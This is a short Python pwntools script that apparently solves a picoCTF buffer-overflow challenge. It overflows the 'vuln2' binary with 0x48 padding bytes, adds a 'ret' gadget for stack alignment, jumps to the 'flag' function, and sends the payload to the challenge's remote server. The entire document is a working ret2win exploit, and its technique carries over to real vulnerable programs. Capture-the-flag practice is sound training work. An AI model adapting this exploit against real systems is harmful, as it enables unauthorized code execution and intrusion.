from pwn import *

elf = ELF('vuln2', checksec=True)

win_addr = elf.symbols['flag']
print(hex(win_addr))
offset_to_fill = 0x40 + 8
# normally just need to add p64(win_addr) but due to ubuntu libc MOVAPS instruction, we need to add p64(ret) as those libc require the stack to be 16 byte aligned before a call
rop = ROP(elf)
ret = (rop.find_gadget(['ret']))[0]

io = remote('saturn.picoctf.net', 59285)
payload = b'A' * offset_to_fill + p64(ret) + p64(win_addr)
print(payload)
io.sendline(payload)
io.interactive()
